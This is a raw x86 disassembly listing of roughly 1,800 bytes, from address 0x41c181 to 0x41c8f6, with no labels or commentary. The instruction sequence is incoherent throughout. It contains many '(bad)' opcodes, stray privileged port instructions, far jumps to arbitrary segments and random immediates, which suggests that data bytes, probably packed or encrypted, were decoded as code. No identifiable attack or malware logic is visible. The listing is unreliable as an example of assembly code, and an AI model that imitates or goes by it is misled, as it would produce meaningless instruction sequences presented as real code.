  41c181:	sahf   
  41c182:	into   
  41c183:	out    0xec,eax
  41c185:	lods   eax,DWORD PTR ds:[esi]
  41c186:	mov    DWORD PTR [ebp+0x5a49f4b1],ebx
  41c18c:	(bad)  
  41c18e:	push   esi
  41c18f:	outs   dx,BYTE PTR ds:[esi]
  41c190:	xchg   edi,eax
  41c191:	mov    WORD PTR [ecx],gs
  41c193:	push   ecx
  41c194:	pop    es
  41c195:	xor    dl,dl
  41c197:	ret    
  41c198:	jmp    0x41c143
  41c19a:	bnd call 0x8c859e95
  41c1a0:	push   0x3c
  41c1a2:	fs out dx,al
  41c1a4:	cdq    
  41c1a5:	push   ds
  41c1a6:	stos   BYTE PTR es:[edi],al
  41c1a7:	cmp    dl,ch
  41c1a9:	js     0x41c1b1
  41c1ab:	adc    al,0xc4
  41c1ad:	add    edx,DWORD PTR [ecx]
  41c1af:	cmp    ecx,DWORD PTR [eax-0x368ad375]
  41c1b5:	loop   0x41c1a6
  41c1b7:	jl     0x41c1a1
  41c1b9:	push   ss
  41c1ba:	fbstp  TBYTE PTR [esi-0x5a245884]
  41c1c0:	fs xchg ebx,eax
  41c1c2:	loop   0x41c212
  41c1c4:	adc    eax,0xb4edd939
  41c1c9:	retf   
  41c1ca:	mov    edx,0x3a1c6e1b
  41c1cf:	sbb    DWORD PTR [esi],esp
  41c1d1:	jge    0x41c162
  41c1d3:	int3   
  41c1d4:	or     al,0xc5
  41c1d6:	dec    esp
  41c1d7:	adc    ecx,ebp
  41c1d9:	inc    ecx
  41c1da:	and    esp,DWORD PTR [ebp+esi*1-0x7b4e6c53]
  41c1e1:	popf   
  41c1e2:	cli    
  41c1e3:	add    eax,0xb76f7de9
  41c1e8:	jle    0x41c225
  41c1ea:	(bad)  
  41c1eb:	shl    edx,1
  41c1ed:	jno    0x41c19f
  41c1ef:	cli    
  41c1f0:	fiadd  WORD PTR [ebx+0x1eba5dd1]
  41c1f6:	popa   
  41c1f7:	xchg   esi,eax
  41c1f8:	sbb    cl,BYTE PTR [edi+eiz*1]
  41c1fb:	mov    eax,0x2ac9edf6
  41c200:	adc    ebx,ebp
  41c202:	xchg   edx,eax
  41c203:	nop
  41c204:	add    BYTE PTR [ebp+ebp*8+0x4a],dl
  41c208:	xor    eax,0x30ccb6e6
  41c20d:	sahf   
  41c20e:	adc    ch,BYTE PTR ds:0x7d2a3e60
  41c214:	jae    0x41c243
  41c216:	push   esp
  41c217:	das    
  41c218:	xor    bh,bl
  41c21a:	inc    ebx
  41c21b:	pop    esp
  41c21c:	std    
  41c21d:	retf   
  41c21e:	push   ss
  41c21f:	dec    ebx
  41c220:	push   0xffffffd6
  41c222:	xor    eax,0xa5e10a7b
  41c227:	xor    al,0xe3
  41c229:	cmp    ebx,0x64559877
  41c22f:	push   esi
  41c230:	xchg   bh,al
  41c232:	nop
  41c233:	push   ds
  41c234:	es cdq 
  41c236:	cmp    al,0x36
  41c238:	(bad)  [ebp-0x6afbe0d0]
  41c23e:	sbb    al,0xe2
  41c240:	xchg   ecx,eax
  41c241:	jg     0x41c1f1
  41c243:	sbb    eax,0x4566d3a3
  41c248:	test   eax,0x63699041
  41c24d:	mov    bl,al
  41c24f:	fs jmp 0xf6a7:0x5043015c
  41c257:	pop    ebp
  41c258:	inc    ebp
  41c259:	xchg   esp,eax
  41c25a:	push   edx
  41c25b:	dec    esp
  41c25c:	(bad)  [edx]
  41c25e:	push   DWORD PTR [edi-0x3ada57f2]
  41c264:	fld    DWORD PTR ds:[edi-0x6a]
  41c268:	adc    BYTE PTR [ebx-0x5d],dl
  41c26b:	loopne 0x41c239
  41c26d:	sbb    BYTE PTR [edx],ch
  41c26f:	mov    esi,0xc991eb36
  41c274:	aaa    
  41c275:	lods   eax,DWORD PTR ds:[esi]
  41c276:	and    edi,0xaa0dc993
  41c27c:	dec    ebp
  41c27d:	nop
  41c27e:	sub    eax,0x1c210e5e
  41c283:	int3   
  41c284:	sar    esp,0x72
  41c287:	push   edi
  41c288:	mov    ah,0xef
  41c28a:	sub    eax,0x2f0eed0b
  41c28f:	inc    edx
  41c290:	xor    ebx,DWORD PTR [eax]
  41c292:	call   0x510bc87b
  41c297:	or     al,0xa0
  41c299:	sti    
  41c29a:	dec    ebp
  41c29b:	jne    0x41c2db
  41c29d:	mov    al,0x69
  41c29f:	xchg   ecx,eax
  41c2a0:	pop    ebp
  41c2a1:	sub    DWORD PTR [ecx],0x99e20200
  41c2a7:	int3   
  41c2a8:	fucomip st,st(7)
  41c2aa:	sbb    ch,0x92
  41c2ad:	pop    ecx
  41c2ae:	adc    BYTE PTR [ecx],ch
  41c2b0:	pop    edx
  41c2b1:	pop    ss
  41c2b2:	stos   DWORD PTR es:[edi],eax
  41c2b3:	cmc    
  41c2b4:	xor    BYTE PTR [ecx],0xe7
  41c2b7:	frndint 
  41c2b9:	push   ebx
  41c2ba:	out    dx,eax
  41c2bb:	push   ebx
  41c2bc:	mov    dh,0x75
  41c2be:	add    ah,cl
  41c2c0:	jmp    0xb27d:0x5d110cdd
  41c2c7:	retf   0xce91
  41c2ca:	leave  
  41c2cb:	mov    edx,0x49c86baa
  41c2d0:	sub    BYTE PTR [ecx+esi*8-0x28],dh
  41c2d4:	add    eax,0xebd48345
  41c2d9:	pusha  
  41c2da:	(bad)  
  41c2db:	shl    BYTE PTR [esp+eiz*2+0x21],cl
  41c2df:	clc    
  41c2e0:	push   edi
  41c2e1:	adc    al,0x3b
  41c2e3:	sub    eax,0x76e91191
  41c2e8:	fwait
  41c2e9:	out    dx,al
  41c2ea:	(bad)  
  41c2eb:	sbb    DWORD PTR [ebx],ecx
  41c2ed:	cdq    
  41c2ee:	fmul   DWORD PTR [esi+0x46e379c4]
  41c2f4:	mov    edx,0x694ddb4c
  41c2f9:	mov    edi,0x78d6ca49
  41c2fe:	pop    esi
  41c2ff:	repnz mov ch,BYTE PTR [ecx+0x7c]
  41c303:	xlat   BYTE PTR ds:[ebx]
  41c304:	out    dx,eax
  41c305:	xlat   BYTE PTR ds:[ebx]
  41c306:	in     eax,dx
  41c307:	xor    ecx,DWORD PTR [ebp-0x61f7ba71]
  41c30d:	dec    esp
  41c30e:	rcr    DWORD PTR [eax],0x49
  41c311:	ret    
  41c312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c313:	cmp    al,0xb5
  41c315:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c316:	add    eax,esp
  41c318:	popf   
  41c319:	xchg   ebx,eax
  41c31a:	cdq    
  41c31b:	mov    edi,0xa5655f60
  41c320:	or     BYTE PTR [eax+edx*4-0x40c3df03],dl
  41c327:	xlat   BYTE PTR ds:[ebx]
  41c328:	data16 mov ah,0x34
  41c32b:	mov    gs,WORD PTR [eax+0x6b]
  41c32e:	sbb    BYTE PTR [ecx+0x38],dl
  41c331:	pop    ecx
  41c332:	test   DWORD PTR [ebx-0x3ac5f1c3],ebp
  41c338:	scas   eax,DWORD PTR es:[edi]
  41c339:	sbb    al,BYTE PTR [edi+eax*2-0x21d8deab]
  41c340:	stos   DWORD PTR es:[edi],eax
  41c341:	sub    DWORD PTR [ecx+0x2c],esi
  41c344:	stos   BYTE PTR es:[edi],al
  41c345:	fnstsw WORD PTR ss:[esi+0x4c]
  41c349:	fcomi  st,st(6)
  41c34b:	or     al,0x99
  41c34d:	jp     0x41c350
  41c34f:	sub    BYTE PTR [edx-0x42],dl
  41c352:	cmp    dl,BYTE PTR gs:[edi+edx*2+0x3fbb66bc]
  41c35a:	imul   eax,DWORD PTR [edi-0x5165bd80],0x44
  41c361:	jmp    0x1f21:0xfb5829f4
  41c368:	fistp  DWORD PTR [eax-0x4394e447]
  41c36e:	mov    dh,BYTE PTR [edi+0x51ef3efc]
  41c374:	push   0x9e6c94c7
  41c379:	pop    ecx
  41c37a:	in     al,dx
  41c37b:	dec    edi
  41c37c:	les    edx,FWORD PTR [ecx+edx*1]
  41c37f:	imul   esi,edx,0xc1890a6b
  41c385:	fidivr DWORD PTR [ebx]
  41c387:	adc    eax,0xe31f17bf
  41c38c:	out    dx,eax
  41c38d:	mov    ecx,0xe1a7465a
  41c392:	sub    BYTE PTR [ecx-0x23],ch
  41c395:	inc    esp
  41c396:	(bad)  
  41c397:	pop    ecx
  41c398:	(bad)  
  41c399:	xlat   BYTE PTR ds:[ebx]
  41c39a:	(bad)  
  41c39b:	call   DWORD PTR [esi+0x747aa970]
  41c3a1:	xchg   ebp,eax
  41c3a2:	add    ebx,edi
  41c3a4:	arpl   WORD PTR [ecx],sp
  41c3a6:	sub    al,BYTE PTR [edx+0x6f]
  41c3a9:	pop    eax
  41c3aa:	gs ins DWORD PTR es:[edi],dx
  41c3ac:	mov    ds:0xe2f5749c,eax
  41c3b1:	dec    ebx
  41c3b2:	dec    eax
  41c3b3:	cwde   
  41c3b4:	(bad)  
  41c3b5:	data16 adc al,0x55
  41c3b8:	fisub  DWORD PTR [ebx]
  41c3ba:	dec    esi
  41c3bb:	pop    edi
  41c3bc:	mov    eax,0x2297d06d
  41c3c1:	out    0xdd,al
  41c3c3:	mov    DWORD PTR [ebp*2+0x39ba6c47],edi
  41c3ca:	ss push es
  41c3cc:	pop    ss
  41c3cd:	in     al,dx
  41c3ce:	push   cs
  41c3cf:	jb     0x41c36c
  41c3d1:	cmp    eax,0x62b9a787
  41c3d6:	aam    0x17
  41c3d8:	jo     0x41c3d7
  41c3da:	pop    ds
  41c3db:	iret   
  41c3dc:	mov    dh,0xf8
  41c3de:	cli    
  41c3df:	pop    es
  41c3e0:	adc    esi,DWORD PTR [edi]
  41c3e2:	in     eax,0x94
  41c3e4:	mov    esp,0xbba670b6
  41c3e9:	adc    BYTE PTR [edx],ch
  41c3eb:	je     0x41c439
  41c3ed:	inc    ebp
  41c3ee:	xlat   BYTE PTR ds:[ebx]
  41c3ef:	jmp    0x714c:0x79000c7b
  41c3f6:	sbb    dl,BYTE PTR [eax]
  41c3f8:	test   DWORD PTR [esi+edx*8],edi
  41c3fb:	jns    0x41c44a
  41c3fd:	clc    
  41c3fe:	xlat   BYTE PTR ds:[ebx]
  41c3ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c400:	add    BYTE PTR [esi],0x17
  41c403:	jnp    0x41c38d
  41c405:	jp     0x41c397
  41c407:	cdq    
  41c408:	inc    eax
  41c409:	dec    ebx
  41c40a:	fld    TBYTE PTR [ecx+0x7629b8c5]
  41c410:	and    al,BYTE PTR [edi]
  41c412:	xor    ecx,DWORD PTR ds:0xdd0d439a
  41c418:	mov    al,ds:0xbbe37319
  41c41d:	(bad)  
  41c41e:	mov    ebp,0x27c4490e
  41c423:	scas   eax,DWORD PTR es:[edi]
  41c424:	lahf   
  41c425:	ins    BYTE PTR es:[edi],dx
  41c426:	add    al,0xa0
  41c428:	mov    ebp,0x552c3f
  41c42d:	jle    0x41c3cd
  41c42f:	test   BYTE PTR [ecx+0x42],dl
  41c432:	pop    ebx
  41c433:	nop
  41c434:	xor    ah,BYTE PTR [edx+0x64]
  41c437:	and    al,BYTE PTR [edi-0x74]
  41c43a:	lods   eax,DWORD PTR ds:[esi]
  41c43b:	jb     0x41c471
  41c43d:	in     al,dx
  41c43e:	scas   al,BYTE PTR es:[edi]
  41c43f:	je     0x41c3ee
  41c441:	or     BYTE PTR [ebp*8-0x39899d0f],bh
  41c448:	fimul  DWORD PTR [eax+0x6b7709d9]
  41c44e:	mov    edx,0x58d3ae9e
  41c453:	int    0x43
  41c455:	loopne 0x41c4a2
  41c457:	es nop
  41c459:	repz fisubr WORD PTR fs:[eax-0x4d0c318b]
  41c461:	dec    ecx
  41c462:	mov    esi,0x8954583b
  41c467:	loope  0x41c4a5
  41c469:	jp     0x41c4bd
  41c46b:	push   0xb4693b50
  41c470:	rcl    DWORD PTR ds:0xc1e81846,0xf9
  41c477:	add    edx,ebx
  41c479:	xchg   eax,eax
  41c47b:	ins    BYTE PTR es:[edi],dx
  41c47c:	(bad)  
  41c47d:	pop    edx
  41c47e:	adc    DWORD PTR [ecx-0x72],esi
  41c481:	clc    
  41c482:	cli    
  41c483:	push   ss
  41c484:	mov    cl,BYTE PTR [esi+esi*2+0x29451711]
  41c48b:	mov    eax,0x1f8fea3
  41c490:	or     ch,dh
  41c492:	push   DWORD PTR [edx]
  41c494:	adc    al,0xdd
  41c496:	dec    ecx
  41c497:	push   ecx
  41c498:	sbb    eax,0x4f4c5756
  41c49d:	adc    al,0x9c
  41c49f:	ds gs loopne 0x41c475
  41c4a3:	or     DWORD PTR [edx+0x9f0cc5b],ebp
  41c4a9:	inc    edx
  41c4aa:	mov    dl,BYTE PTR [eax+0x66ce4d9]
  41c4b0:	mov    esp,esi
  41c4b2:	mov    ebp,0x2da5e12f
  41c4b7:	and    ebx,DWORD PTR [edi]
  41c4b9:	ja     0x41c4d0
  41c4bb:	aaa    
  41c4bc:	adc    eax,0xb636ecfc
  41c4c1:	repnz popf 
  41c4c3:	out    dx,eax
  41c4c4:	mov    ds:0xcd1e164a,eax
  41c4c9:	xchg   ebx,eax
  41c4ca:	aaa    
  41c4cb:	stos   BYTE PTR es:[edi],al
  41c4cc:	int3   
  41c4cd:	pop    edx
  41c4ce:	js     0x41c4ae
  41c4d0:	pop    ebp
  41c4d1:	icebp  
  41c4d2:	push   eax
  41c4d3:	jno    0x41c540
  41c4d5:	mov    ebp,0x14db464
  41c4da:	ins    DWORD PTR es:[edi],dx
  41c4db:	jbe    0x41c4a7
  41c4dd:	xor    ebp,DWORD PTR [ebx+0x4905dc0]
  41c4e3:	ret    
  41c4e4:	daa    
  41c4e5:	add    dl,bh
  41c4e7:	stos   DWORD PTR es:[edi],eax
  41c4e8:	pop    edi
  41c4e9:	cmp    bl,BYTE PTR [esi+0x5c]
  41c4ec:	clc    
  41c4ed:	pushf  
  41c4ee:	loop   0x41c511
  41c4f0:	inc    ecx
  41c4f1:	imul   ecx,DWORD PTR [ebx+0x57],0xacf0ec3f
  41c4f8:	loop   0x41c4fe
  41c4fa:	(bad)  
  41c4fb:	or     al,0xd6
  41c4fd:	or     esp,DWORD PTR [edi-0x2c5ddae1]
  41c503:	rol    esp,1
  41c505:	aaa    
  41c506:	push   eax
  41c507:	cs jae 0x41c520
  41c50a:	leave  
  41c50b:	jae    0x41c57a
  41c50d:	jmp    0x41c490
  41c50f:	int3   
  41c510:	inc    edi
  41c511:	jnp    0x41c522
  41c513:	mov    bl,0x32
  41c515:	jge    0x41c4a9
  41c517:	sbb    DWORD PTR [edx-0x1b5a1ed1],ebx
  41c51d:	icebp  
  41c51e:	pop    ecx
  41c51f:	stc    
  41c520:	out    0x69,al
  41c522:	ror    eax,cl
  41c524:	jmp    0x396a:0x350ce02a
  41c52b:	fist   WORD PTR [edi+ebx*2+0x6c]
  41c52f:	repnz fadd QWORD PTR [eax-0x10270487]
  41c536:	das    
  41c537:	lahf   
  41c538:	mov    bh,0x82
  41c53a:	pop    ecx
  41c53b:	daa    
  41c53c:	mov    ?,WORD PTR [ebx]
  41c53e:	out    dx,eax
  41c53f:	ja     0x41c566
  41c541:	les    edi,FWORD PTR [edi+eiz*1+0xffecbf7]
  41c548:	gs sub al,0x6
  41c54b:	inc    edx
  41c54c:	lds    eax,FWORD PTR [eax-0x6ed01d36]
  41c552:	ins    DWORD PTR es:[edi],dx
  41c553:	dec    eax
  41c554:	xor    dh,BYTE PTR [esp+eax*4-0x30]
  41c558:	push   esi
  41c559:	pusha  
  41c55a:	or     ah,BYTE PTR [edx-0x377da19]
  41c560:	lods   eax,DWORD PTR ds:[esi]
  41c561:	out    dx,eax
  41c562:	mov    al,ds:0x7ef0cae8
  41c567:	and    edx,DWORD PTR [ebx]
  41c569:	jb     0x41c5a9
  41c56b:	cmp    ah,BYTE PTR [ebx]
  41c56d:	adc    DWORD PTR [ebx+0x525915bf],esp
  41c573:	(bad)  
  41c574:	xchg   ecx,eax
  41c575:	(bad)  
  41c576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c577:	test   al,0x38
  41c579:	jo     0x41c573
  41c57b:	aad    0x8e
  41c57d:	retf   0xbb81
  41c580:	pop    es
  41c581:	loop   0x41c5a4
  41c583:	ds push ebp
  41c585:	js     0x41c5c7
  41c587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c588:	int    0xfd
  41c58a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c58b:	cli    
  41c58c:	adc    al,BYTE PTR [esi]
  41c58e:	or     DWORD PTR [edi+0x2c9aaef5],esp
  41c594:	loop   0x41c56e
  41c596:	inc    ecx
  41c597:	pop    esi
  41c598:	addr16 jo 0x41c5f4
  41c59b:	pop    edx
  41c59c:	add    al,0x59
  41c59e:	shl    edx,1
  41c5a0:	dec    ebp
  41c5a1:	div    BYTE PTR [ecx]
  41c5a3:	dec    edi
  41c5a4:	aas    
  41c5a5:	pop    edi
  41c5a6:	ficomp DWORD PTR [edi-0x20]
  41c5a9:	push   es
  41c5aa:	ins    BYTE PTR es:[edi],dx
  41c5ab:	mov    al,ds:0xd35cfbc7
  41c5b0:	aad    0x56
  41c5b2:	imul   esi,esp,0xffffff8a
  41c5b5:	(bad)  
  41c5b6:	cwde   
  41c5b7:	outs   dx,DWORD PTR ds:[esi]
  41c5b8:	outs   dx,BYTE PTR ds:[esi]
  41c5b9:	dec    ebp
  41c5ba:	and    eax,0x3d306831
  41c5bf:	xchg   ebx,eax
  41c5c0:	stos   DWORD PTR es:[edi],eax
  41c5c1:	in     eax,dx
  41c5c2:	and    BYTE PTR [ebx-0x108bfff3],0xb9
  41c5c9:	jno    0x41c642
  41c5cb:	xchg   ebp,eax
  41c5cc:	dec    ecx
  41c5cd:	jno    0x41c5a3
  41c5cf:	adc    al,0x29
  41c5d1:	shr    esi,1
  41c5d3:	sbb    ch,bh
  41c5d5:	call   0x82e3aa7
  41c5da:	mov    bl,0xd3
  41c5dc:	shl    dl,1
  41c5de:	sub    BYTE PTR ss:[eax-0x42bf3531],bh
  41c5e5:	aam    0x66
  41c5e7:	test   eax,0x1b0749b5
  41c5ec:	add    ebx,ebp
  41c5ee:	sbb    DWORD PTR [edi-0x627b934a],esp
  41c5f4:	jo     0x41c662
  41c5f6:	or     edi,ebp
  41c5f8:	mov    DWORD PTR [ebx+esi*1+0x2c38e6f2],edi
  41c5ff:	mov    WORD PTR [eax-0x44599935],?
  41c605:	retf   
  41c606:	neg    BYTE PTR [edi-0x6f]
  41c609:	ret    0x89a9
  41c60c:	inc    ebx
  41c60d:	repnz aad 0xb0
  41c610:	clc    
  41c611:	xchg   DWORD PTR [eax+0x600f25c],esp
  41c617:	and    dl,BYTE PTR [ecx-0x49]
  41c61a:	xor    al,BYTE PTR [ecx]
  41c61c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c61d:	sbb    DWORD PTR [ebp+eax*8+0x33],edi
  41c621:	jne    0x41c5ef
  41c623:	xor    al,0xc7
  41c625:	mov    cl,0x5
  41c627:	sub    cl,ah
  41c629:	mov    edx,0xb7cc09a0
  41c62e:	inc    eax
  41c62f:	test   DWORD PTR [ebx-0x4d],ecx
  41c632:	outs   dx,BYTE PTR ds:[esi]
  41c633:	mov    al,0x7d
  41c635:	test   eax,0x71f34da2
  41c63a:	out    0x2a,al
  41c63c:	adc    eax,0xb6a0cd9f
  41c641:	adc    BYTE PTR [ecx+0xc],cl
  41c644:	add    DWORD PTR [eax],eax
  41c646:	xchg   ebx,eax
  41c647:	sub    eax,0x47bd2c66
  41c64c:	in     eax,0xcb
  41c64e:	outs   dx,BYTE PTR ds:[esi]
  41c64f:	mov    DWORD PTR [ebp-0x5d3b2c9c],esi
  41c655:	sbb    eax,0x433cab5f
  41c65a:	test   ebp,ebp
  41c65c:	xchg   edx,eax
  41c65d:	and    BYTE PTR [edx-0x66],bh
  41c660:	sbb    DWORD PTR [edx+0x30],eax
  41c663:	push   0x853ad390
  41c668:	inc    eax
  41c669:	push   esi
  41c66a:	cli    
  41c66b:	mov    ecx,0x56f486ea
  41c670:	push   ss
  41c671:	loope  0x41c6a0
  41c673:	popf   
  41c674:	and    eax,0x388238f6
  41c679:	das    
  41c67a:	leave  
  41c67b:	jl     0x41c69a
  41c67d:	pop    ds
  41c67e:	loop   0x41c62a
  41c680:	mov    esi,0xbcebb88f
  41c685:	jno    0x41c609
  41c687:	enter  0x1dd0,0xae
  41c68b:	les    esi,FWORD PTR [eax+0xc]
  41c68e:	mov    edx,0x944b04c9
  41c693:	retf   
  41c694:	mov    esp,0xe508ec44
  41c699:	dec    edx
  41c69a:	cdq    
  41c69b:	sub    dl,al
  41c69d:	mov    bh,0x1f
  41c69f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6a0:	imul   edx,DWORD PTR [ebx],0x1000162b
  41c6a6:	daa    
  41c6a7:	les    ebx,FWORD PTR [edx+0x8a7b726]
  41c6ad:	xchg   ebx,eax
  41c6ae:	call   0x24a1:0xefe88407
  41c6b5:	xchg   BYTE PTR [esi],bl
  41c6b7:	add    esp,ecx
  41c6b9:	scas   eax,DWORD PTR es:[edi]
  41c6ba:	pushf  
  41c6bb:	xor    DWORD PTR [ebx],ecx
  41c6bd:	lahf   
  41c6be:	jmp    0x41c70b
  41c6c0:	imul   ebx,DWORD PTR [eax],0xffffffca
  41c6c3:	xchg   DWORD PTR [ebx-0x6aa11edf],edi
  41c6c9:	(bad)  
  41c6ca:	mov    eax,0xe2bff663
  41c6cf:	jne    0x41c737
  41c6d1:	mov    ds:0xa8a91ee5,al
  41c6d6:	xchg   esi,eax
  41c6d7:	cwde   
  41c6d8:	or     al,BYTE PTR [ebx]
  41c6da:	sub    DWORD PTR [esi+0x16],edx
  41c6dd:	popa   
  41c6de:	lds    esi,FWORD PTR [ebp+0x33]
  41c6e1:	retf   
  41c6e2:	push   0xffffffe0
  41c6e4:	and    eax,0x7756d699
  41c6e9:	loop   0x41c70e
  41c6eb:	cwde   
  41c6ec:	sahf   
  41c6ed:	adc    DWORD PTR [esi-0x1c],esi
  41c6f0:	adc    DWORD PTR [ebp+0x57],edi
  41c6f3:	dec    esi
  41c6f4:	add    eax,0xba034621
  41c6f9:	mov    esp,0x16024dad
  41c6fe:	repz fstp DWORD PTR [ecx]
  41c701:	push   esi
  41c702:	jno    0x41c6e3
  41c704:	mov    edx,ebp
  41c706:	push   ds
  41c707:	push   ebp
  41c708:	pop    ebp
  41c709:	mov    esp,0x5402c3ae
  41c70e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c70f:	pop    ebp
  41c710:	pop    ecx
  41c711:	les    eax,FWORD PTR [edi-0x4]
  41c714:	pop    esi
  41c715:	mov    ds:0xe9af71d1,al
  41c71a:	sbb    ch,BYTE PTR [esi]
  41c71c:	mov    dh,0xf9
  41c71e:	aad    0xc4
  41c720:	mov    al,0x35
  41c722:	jne    0x41c78a
  41c724:	push   es
  41c725:	ja     0x41c71d
  41c727:	xchg   esi,eax
  41c728:	mov    ecx,0x657e4e26
  41c72d:	in     al,0x5b
  41c72f:	jmp    0x3bad:0x3b6c5360
  41c736:	scas   al,BYTE PTR es:[edi]
  41c737:	and    BYTE PTR [edi-0x65],al
  41c73a:	into   
  41c73b:	xor    cl,bl
  41c73d:	cmp    al,0xbc
  41c73f:	mov    cl,0x7a
  41c741:	dec    ebx
  41c742:	mov    dh,0xfe
  41c744:	mov    dh,0xe2
  41c746:	xchg   BYTE PTR [ecx],ch
  41c748:	pop    ss
  41c749:	sahf   
  41c74a:	dec    ebp
  41c74b:	ss aaa 
  41c74d:	(bad)  
  41c74e:	(bad)  [ebx-0x5b71cd6c]
  41c754:	add    BYTE PTR [ebx-0x32],cl
  41c757:	dec    esp
  41c758:	jmp    0xa318cdcb
  41c75d:	push   0xffffffd6
  41c75f:	dec    ebx
  41c760:	in     eax,dx
  41c761:	in     eax,dx
  41c762:	jns    0x41c720
  41c764:	repnz arpl WORD PTR [ebp+0x4725b1c9],ax
  41c76b:	mov    edi,0xec258006
  41c770:	or     eax,0x87b8dc70
  41c775:	repnz inc esi
  41c777:	stos   BYTE PTR es:[edi],al
  41c778:	pusha  
  41c779:	xor    BYTE PTR [eax+0x28a45106],0x51
  41c780:	pop    esp
  41c781:	dec    ecx
  41c782:	call   0xeb57:0x7fe6c59
  41c789:	jne    0x41c7ff
  41c78b:	cmp    al,bl
  41c78d:	imul   BYTE PTR [esi+ebx*4+0x599b4776]
  41c794:	clc    
  41c795:	cli    
  41c796:	lahf   
  41c797:	pop    ecx
  41c798:	pop    edx
  41c799:	add    al,0xb0
  41c79b:	ret    0xbd6
  41c79e:	hlt    
  41c79f:	aad    0x9f
  41c7a1:	sti    
  41c7a2:	mov    cl,0x7b
  41c7a4:	jo     0x41c7a4
  41c7a6:	pop    es
  41c7a7:	mov    bl,0xee
  41c7a9:	sbb    ah,cl
  41c7ab:	adc    eax,ebp
  41c7ad:	shl    DWORD PTR [edi-0x38],cl
  41c7b0:	mov    al,ds:0xadb3e10f
  41c7b5:	icebp  
  41c7b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7b7:	push   ebx
  41c7b8:	mov    ds:0xad010827,eax
  41c7bd:	jns    0x41c839
  41c7bf:	pusha  
  41c7c0:	mov    esp,0x7daf3ebd
  41c7c5:	mov    ecx,0x72f5d393
  41c7ca:	dec    ecx
  41c7cb:	mov    ebx,0xbb148ff1
  41c7d0:	sub    eax,0xf37a4f91
  41c7d5:	fbstp  TBYTE PTR [esi+ebp*4]
  41c7d8:	adc    dl,BYTE PTR [edi]
  41c7da:	mov    bl,0x79
  41c7dc:	out    0x80,eax
  41c7de:	adc    dl,BYTE PTR [esi+0x2bf80346]
  41c7e4:	sbb    eax,0x4931b5bb
  41c7e9:	daa    
  41c7ea:	and    dl,BYTE PTR ds:0x501315fa
  41c7f0:	in     eax,0x4c
  41c7f2:	and    esi,DWORD PTR [edi+0x34cf101d]
  41c7f8:	fld    TBYTE PTR [ecx-0x52354a29]
  41c7fe:	jle    0x41c81f
  41c800:	jne    0x41c839
  41c802:	test   eax,0x9a577a12
  41c807:	pusha  
  41c808:	sub    BYTE PTR [eax+0x62],bl
  41c80b:	loop   0x41c7c2
  41c80d:	mov    eax,ds:0x9dcede5c
  41c812:	inc    ebx
  41c813:	sbb    DWORD PTR [edx-0x4d1ad9bb],esp
  41c819:	mov    WORD PTR ds:0xa3938173,ss
  41c81f:	rol    esi,cl
  41c821:	sbb    ecx,edx
  41c823:	mov    ch,0xad
  41c825:	add    eax,0x9d763342
  41c82a:	test   eax,0x42daa72e
  41c82f:	lahf   
  41c830:	je     0x41c7ba
  41c832:	into   
  41c833:	cwde   
  41c834:	sub    al,0x55
  41c836:	adc    eax,0x1fd94480
  41c83b:	std    
  41c83c:	pop    ebx
  41c83d:	inc    eax
  41c83e:	pop    ebp
  41c83f:	xor    cl,BYTE PTR [ecx]
  41c841:	aas    
  41c842:	pusha  
  41c843:	inc    ebp
  41c844:	test   BYTE PTR [eax-0x7a],ah
  41c847:	xor    BYTE PTR [edx],bh
  41c849:	and    al,0x29
  41c84b:	add    al,0x22
  41c84d:	jmp    0x41c7e7
  41c84f:	mov    bh,0x16
  41c851:	mov    dh,0xf6
  41c853:	adc    DWORD PTR [ebx+0x6e],ebp
  41c856:	add    BYTE PTR [ebx+0x8ac0e20],ch
  41c85c:	gs pushf 
  41c85e:	mov    al,0xed
  41c860:	out    0x22,eax
  41c862:	pop    ss
  41c863:	fisttp DWORD PTR [eax-0x56e4ca06]
  41c869:	xchg   ebx,eax
  41c86a:	sbb    al,0xe7
  41c86c:	mov    BYTE PTR [edx+0x33],0x92
  41c870:	sahf   
  41c871:	jno    0x41c85e
  41c873:	mov    ebp,0x1e9b9d5c
  41c878:	jp     0x41c865
  41c87a:	cmp    DWORD PTR [esi],edi
  41c87c:	mov    cl,0xfc
  41c87e:	adc    eax,0x88f88d00
  41c883:	xchg   ebp,eax
  41c884:	xchg   BYTE PTR [edi+ecx*8-0x2129faf0],dh
  41c88b:	leave  
  41c88c:	cmp    DWORD PTR [eax],0x1b
  41c88f:	pop    esp
  41c890:	not    BYTE PTR [ecx+eax*8]
  41c893:	mov    ecx,0x7d771d7d
  41c898:	xchg   ebp,eax
  41c899:	iret   
  41c89a:	neg    DWORD PTR ds:0xdd358d2
  41c8a0:	mov    eax,0xa0f13b6f
  41c8a5:	fs sbb eax,0x73252220
  41c8ab:	or     DWORD PTR [eax+edx*1-0x2d44d10f],0x76
  41c8b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8b4:	pop    ecx
  41c8b5:	pop    edi
  41c8b6:	sti    
  41c8b7:	repz sub BYTE PTR ds:0xc783deb4,bh
  41c8be:	xchg   ebp,eax
  41c8bf:	sub    BYTE PTR [eax-0x9],bh
  41c8c2:	xchg   esp,edx
  41c8c4:	xor    DWORD PTR [eax-0x303c9da4],ebp
  41c8ca:	mov    ds:0xaba128c7,al
  41c8cf:	fwait
  41c8d0:	pop    eax
  41c8d1:	mov    es,WORD PTR [eax-0x2ed22b53]
  41c8d7:	stos   DWORD PTR es:[edi],eax
  41c8d8:	and    BYTE PTR [edx],0x4c
  41c8db:	out    dx,al
  41c8dc:	jo     0x41c8fd
  41c8de:	mov    ds:0xfe1e641f,al
  41c8e3:	aad    0xf4
  41c8e5:	or     DWORD PTR [esi+0x5705cfeb],ebx
  41c8eb:	test   BYTE PTR [edi],0xb0
  41c8ee:	rol    BYTE PTR [ecx-0x4e],1
  41c8f1:	(bad)  
  41c8f2:	scas   al,BYTE PTR es:[edi]
  41c8f3:	in     al,dx
  41c8f4:	and    esp,esi
  41c8f6:	adc    edx,DWORD PTR [ecx+0x6]
